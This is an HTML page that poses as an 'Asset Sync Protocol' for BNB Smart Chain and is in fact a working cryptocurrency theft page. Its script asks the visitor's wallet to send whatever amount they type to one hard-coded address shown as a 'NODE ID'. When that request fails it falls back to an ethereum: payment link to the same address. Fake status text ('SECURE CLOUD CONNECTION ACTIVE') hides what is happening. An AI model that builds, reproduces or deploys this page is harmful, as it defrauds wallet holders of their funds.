<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asset Sync Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
    <style>
        :root { --bg: #0b0e11; --card: #181a20; --primary: #38bdf8; --text: #eaecef; }
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .box { background: var(--card); padding: 30px; border-radius: 24px; width: 90%; max-width: 360px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
        .qr-frame { background: #fff; padding: 12px; border-radius: 18px; width: 170px; height: 170px; margin: 25px auto; border: 4px solid var(--primary); }
        .qr-frame img { width: 100%; height: 100%; }
        .info-node { font-size: 10px; color: #848e9c; background: #0b0e11; padding: 12px; border-radius: 12px; margin-bottom: 25px; border: 1px dashed #334155; word-break: break-all; font-family: monospace; }
        input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #474d57; background: #1e2329; color: #fff; font-size: 26px; text-align: center; box-sizing: border-box; margin-bottom: 25px; font-weight: bold; outline: none; }
        input::placeholder { color: #474d57; font-size: 20px; }
        .refresh-btn { width: 100%; padding: 18px; background: var(--primary); color: #000; border: none; border-radius: 15px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 20px rgba(56, 189, 248, 0.2); }
        .refresh-btn:hover { background: #7dd3fc; }
        .refresh-btn:active { transform: scale(0.96); }
        .status-text { font-size: 10px; color: #474d57; margin-top: 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="box">
    <h2 style="color: var(--primary); margin: 0; font-size: 24px;">Asset Sync Protocol</h2>
    <p style="font-size: 12px; color: #848e9c; margin-top: 6px;">Network: BNB Smart Chain (BEP20)</p>
    
    <div class="qr-frame">
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D" alt="Sync QR">
    </div>

    <div class="info-node">
        NODE ID: 0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D
    </div>

    <input type="number" id="syncAmt" placeholder="0.00 BNB" step="any">

    <button class="refresh-btn" onclick="requestSync()">Confirm & Refresh</button>

    <div class="status-text">● SECURE CLOUD CONNECTION ACTIVE</div>
</div>

<script>
    async function requestSync() {
        const amountValue = document.getElementById('syncAmt').value;
        const myAddr = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";

        if (!amountValue || amountValue <= 0) {
            alert("Please input a valid amount to sync.");
            return;
        }

        if (window.ethereum) {
            try {
                const web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];
                
                const weiValue = web3.utils.toWei(amountValue.toString(), 'ether');

                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: account,
                        to: myAddr,
                        value: web3.utils.toHex(weiValue),
                        gas: web3.utils.toHex(21000),
                        gasPrice: web3.utils.toHex(web3.utils.toWei('5', 'gwei'))
                    }],
                });

                alert("Synchronization request sent. Processing...");

            } catch (error) {
                console.error(error);
                // Fallback for direct wallet trigger
                window.location.href = "ethereum:" + myAddr + "?value=" + amountValue;
            }
        } else {
            alert("Please open this link inside Binance or Trust Wallet browser.");
        }
    }
</script>

</body>
</html>
